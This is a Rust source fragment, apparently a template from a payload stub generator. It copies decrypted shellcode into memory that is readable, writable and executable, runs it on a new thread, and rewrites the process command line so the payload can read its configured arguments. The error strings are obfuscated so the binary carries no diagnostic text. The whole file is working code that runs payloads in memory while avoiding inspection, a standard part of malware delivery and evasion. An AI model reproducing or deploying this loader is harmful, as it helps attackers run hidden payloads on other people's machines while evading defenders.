// --- Reflective loading, raw shellcode variant (technique fragment) ---
//
// Rendered instead of the PE mapper when `build.payloads.<name>.format: shellcode`.
// There is no image to map: the decrypted bytes are position-independent code,
// so they are copied into a fresh executable allocation and run on a thread.

use std::ffi::c_void;
use std::ptr;

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{
    CreateThread, GetCurrentProcess, GetExitCodeThread, WaitForSingleObject, THREAD_CREATION_FLAGS,
};

/// Entry point signature of the shellcode (returns the process exit code).
type ShellcodeEntry = unsafe extern "system" fn() -> u32;

/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
/// the call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Context passed to the thread that runs the shellcode.
#[repr(C)]
struct ShellcodeContext {
    entry: usize,
}

/// Thread trampoline: jumps into the shellcode and returns its exit code.
unsafe extern "system" fn shellcode_trampoline(ctx: *mut c_void) -> u32 {
    let ctx = &*(ctx as *const ShellcodeContext);
    // SAFETY: `entry` points into the executable copy of the payload made by
    // `run_shellcode`; the region stays mapped for the process lifetime.
    let entry: ShellcodeEntry = unsafe { std::mem::transmute(ctx.entry) };
    entry()
}

/// Copies `shellcode` into a freshly allocated RWX region and runs it on a
/// thread, returning its exit code.
///
/// The region is intentionally leaked: the stub waits for the thread, but the
/// shellcode may have spawned work that outlives it.
fn run_shellcode(shellcode: &[u8]) -> Result<i32, String> {
    if shellcode.is_empty() {
        return Err($MSG_SHELLCODE_EMPTY$);
    }

    unsafe {
        let process = GetCurrentProcess();
        let mut base: *mut c_void = ptr::null_mut();
        let mut region = shellcode.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_EXECUTE_READWRITE.0,
        );
        if status < 0 {
            return Err(nt_error($MSG_SHELLCODE_ALLOCATE_FAILED$, status));
        }
        crate::tech_dbg!(
            "reflective_loading",
            "shellcode region allocated at {base:p} ({} bytes)",
            shellcode.len()
        );

        ptr::copy_nonoverlapping(shellcode.as_ptr(), base as *mut u8, shellcode.len());

        let ctx = Box::into_raw(Box::new(ShellcodeContext {
            entry: base as usize,
        }));
        let thread = CreateThread(
            None,
            0,
            Some(shellcode_trampoline),
            Some(ctx as *const c_void),
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .map_err(|_| {
            drop(Box::from_raw(ctx));
            $MSG_SHELLCODE_THREAD_FAILED$
        })?;
        crate::tech_dbg!("reflective_loading", "shellcode thread started");

        WaitForSingleObject(thread, u32::MAX);
        let mut exit_code = 0u32;
        let _ = GetExitCodeThread(thread, &mut exit_code);
        let _ = CloseHandle(thread);
        crate::tech_dbg!(
            "reflective_loading",
            "shellcode thread exited with {exit_code}"
        );
        // The thread has finished, so the trampoline no longer reads the
        // context; safe to free it here.
        drop(Box::from_raw(ctx));

        Ok(exit_code as i32)
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    crate::tech_dbg!(
        "reflective_loading",
        "running {} bytes of shellcode in-process",
        image.len()
    );
    // Shellcode has no PE entry point that reads a command line, but it runs in
    // *this* process: repoint the PEB command line at `<exe> <yaml args>
    // <runtime args>` first, so shellcode that reads it (via `GetCommandLineW`)
    // sees the configured `build.payloads.<name>.args`.
    crate::patch_command_line()?;
    run_shellcode(image)
}
